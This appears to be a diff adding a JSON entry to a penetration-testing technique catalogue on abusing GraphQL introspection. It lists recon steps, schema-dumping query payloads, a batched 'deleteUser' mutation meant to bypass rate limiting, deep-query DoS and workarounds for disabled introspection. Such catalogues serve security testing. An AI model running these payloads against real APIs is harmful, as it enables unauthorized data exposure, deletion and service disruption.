@@ -1,0 +1,60 @@
+{
+  "id": "api-graphql-introspection",
+  "title": "GraphQL Introspection Abuse",
+  "category": "api",
+  "tags": ["graphql", "introspection", "information-disclosure", "api"],
+  "applicability": {
+    "technologies": ["node", "python", "java", "ruby", "go", "graphql"],
+    "contexts": ["api-endpoint", "graphql-endpoint"],
+    "preconditions": ["graphql-api", "introspection-enabled"]
+  },
+  "technique": {
+    "summary": "Use GraphQL introspection queries to discover the entire API schema, including hidden fields, mutations, and types. This reveals the full attack surface including admin-only operations, sensitive fields, and internal types.",
+    "steps": [
+      "Identify the GraphQL endpoint (commonly /graphql, /api/graphql, /gql)",
+      "Send an introspection query to dump the full schema",
+      "Analyze types, queries, mutations, and subscriptions for sensitive operations",
+      "Look for admin mutations, internal fields, deprecated but active endpoints",
+      "Test each discovered mutation/query for authorization issues",
+      "Check for query depth/complexity limits — abuse deeply nested queries for DoS",
+      "Test batch queries to bypass rate limiting"
+    ],
+    "payloads": [
+      {
+        "payload": "{\"query\":\"{__schema{types{name,fields{name,type{name,kind,ofType{name}}}}}}\"}",
+        "encoding": "raw",
+        "context": "json-body",
+        "notes": "Full schema introspection query"
+      },
+      {
+        "payload": "{\"query\":\"{__type(name:\\\"User\\\"){name,fields{name,type{name}}}}\"}",
+        "encoding": "raw",
+        "context": "json-body",
+        "notes": "Type-specific introspection"
+      },
+      {
+        "payload": "{\"query\":\"query{__schema{mutationType{fields{name,args{name,type{name}}}}}}\"}",
+        "encoding": "raw",
+        "context": "json-body",
+        "notes": "List all mutations with their arguments"
+      },
+      {
+        "payload": "[{\"query\":\"mutation{deleteUser(id:1){id}}\"},{\"query\":\"mutation{deleteUser(id:2){id}}\"}]",
+        "encoding": "raw",
+        "context": "json-body",
+        "notes": "Batch mutation — may bypass rate limiting"
+      }
+    ],
+    "bypassTechniques": [
+      "If introspection is disabled, try field suggestion probing: {use} → 'Did you mean user?'",
+      "Use GET requests with query parameter instead of POST",
+      "Try alternate endpoints: /graphql/v1, /api, /graphql/console",
+      "Check if introspection is only disabled in production but enabled in staging"
+    ]
+  },
+  "references": [
+    "https://portswigger.net/web-security/graphql",
+    "https://graphql.org/learn/introspection/"
+  ],
+  "source": "portswigger-research"
+}
